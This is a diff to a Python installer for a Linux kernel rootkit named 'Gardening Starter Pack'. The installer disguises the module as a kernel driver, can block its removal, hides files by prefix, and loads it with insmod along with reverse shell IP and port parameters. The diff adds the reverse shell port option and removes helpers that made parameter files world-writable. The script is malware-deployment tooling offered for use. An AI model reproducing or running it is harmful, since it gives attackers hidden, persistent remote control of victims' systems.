@@ -8,13 +8,6 @@ from shutil import move
 from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen
 
 #######
-# Globals
-#######
-
-# These must be identical to the parameters declared in rootkit/rootkit.c
-MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "block_removal", "keylogger"]
-
-#######
 # Prompting/Printing
 ######
 
@@ -49,7 +42,7 @@ def print_question(text):
 
 def print_help():
 	print("Gardening Starter Pack (Rootkit) Usage")
-	print("Written by Aaron Lichtman and Arch Gupta.")
+	print("Written by Aaron Lichtman. @alichtman on GitHub.")
 	print("\t--install\t\tinstall the rootkit.")
 	print("\t--uninstall\t\tuninstall the rootkit.")
 	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")
@@ -153,15 +146,16 @@ def load_module(module_path, config):
 	"""
 	Run $ insmod module, appending any included parameters.
 	REVERSE_SHELL_IP: The IP address the reverse shell will connect to.
+	REVERSE_SHELL_PORT: The PORT the reverse shell will connect to.
 	HIDDEN_FILE_PREFIX: The prefix of files that will be hidden.
 	BLOCK_REMOVAL: Toggle for blocking the removal of the rootkit.
-
-	// TODO: Refactor to use PARAMS constant
 	"""
 	print_status("Loading module...")
 	options = ""
+	# Assume PORT exists if IP exists
 	if "REVERSE_SHELL_IP" in config and config["REVERSE_SHELL_IP"] is not None:
 		options += " rev_shell_ip=\"{}\" ".format(config["REVERSE_SHELL_IP"])
+		options += " rev_shell_port=\"{}\" ".format(config["REVERSE_SHELL_PORT"])
 
 	if "HIDDEN_FILE_PREFIX" in config:
 		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
@@ -209,57 +203,6 @@ def remove_persistence(module_name):
 
 
 ####
-# Changing permissions on action toggles
-####
-
-def get_all_param_files(driver_name, module_params):
-	return ["/sys/module/{}/parameters/{}".format(driver_name, param) for param in module_params]
-
-
-# def update_permissions(driver_name):
-# 	"""
-# 	Makes it so that all kernel module parameter files can be written
-# 	to by any user.
-# 	"""
-# 	for file in get_all_param_files(driver_name, MODULE_PARAMS):
-# 		os.chmod(file, 0o777)
-
-
-# def symlink_command_files(driver_name):
-# 	"""
-# 	Creates symlinks from all module parameter files to dest_dir/<PARAM>.
-# 	This lets us shorten a command from:
-# 	$ echo "$IP > /sys/module/garden/parameters/reverse_shell_ip
-# 	to $ echo "$IP > /garden/reverse_shell_ip
-# 	"""
-# 	dest_path = "/" + driver_name
-# 	if not os.path.isdir(dest_path):
-# 		os.mkdir(dest_path)
-#
-# 	for source_param_file in get_all_param_files(driver_name, MODULE_PARAMS):
-# 		param_name = source_param_file.split("/")[-1]
-# 		symlink_file = "{}/{}".format(dest_path, param_name)
-# 		if not os.path.islink(symlink_file):
-# 			os.symlink(source_param_file, symlink_file)
-
-
-def cleanup_command_files(driver_name):
-	"""
-	Removes all symlinked files created in symlink_command_files().
-	"""
-	symlinks = ["/{}/{}".format(driver_name, param_name) for param_name in MODULE_PARAMS]
-	for link in symlinks:
-		if os.path.islink(link):
-			print_status("Removing: " + link)
-			os.unlink(link)
-
-	command_dir = "/" + driver_name
-	if os.path.isdir(command_dir):
-		print_status("Removing: " + command_dir)
-		os.rmdir(command_dir)
-
-
-####
 # Main Setup Methods
 # 	- Install
 # 	- Uninstall
@@ -277,6 +220,7 @@ def validate_os_and_kernel():
 		sys.exit(1)
 
 	kernel_version = os_info[2]
+	# TODO: Test more kernels.
 	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic", "4.18.0-17-generic"]
 	if kernel_version not in valid_kernels:
 		print_error("Invalid kernel. Exiting.")
@@ -288,15 +232,14 @@ def validate_os_and_kernel():
 def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
-	config = {
-		"MODULE_NAME": "garden"
-	}
-
-	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", config["MODULE_NAME"])
+	# Rootkit settings
+	config = {}
+	config["MODULE_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	config["BLOCK_REMOVAL"] = prompt_yes_no("Block removal of rootkit?")
 
 	if prompt_yes_no("Enable reverse shell?"):
 		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", None)
+		config["REVERSE_SHELL_PORT"] = prompt("Enter port for reverse shell.", None)
 
 	if prompt_yes_no("Enable hidden files?"):
 		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", config["MODULE_NAME"])
@@ -313,9 +256,10 @@ def install(kernel_version):
 	run_cmd_exit_on_fail("make all", "./rootkit")
 	print_success("Successful compilation.")
 
-	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
+	# Move compiled components to the right place.
+	# TODO: Support differently named modules. At the moment, nothing except for the module name "garden" is supported.
 	print_status("Installing rootkit...")
-	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, driver_name)
+	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["MODULE_NAME"])
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
 
@@ -338,8 +282,6 @@ def install(kernel_version):
 	# Unload kernel module if it's already loaded and load new module.
 	unload_module(config["MODULE_NAME"])
 	load_module(module_dest_path, config)
-	# update_permissions(driver_name)
-	# symlink_command_files(config["MODULE_NAME"])
 	print_success("Successful installation.")
 
 
@@ -350,7 +292,6 @@ def uninstall():
 	print_status("Starting rootkit removal...")
 	module = prompt("Enter the name of the module to remove.", "garden")
 	remove_persistence(module)
-	# cleanup_command_files(module)
 	unload_module(module)
 	print_success("Removed {} from modules.".format(module))
 
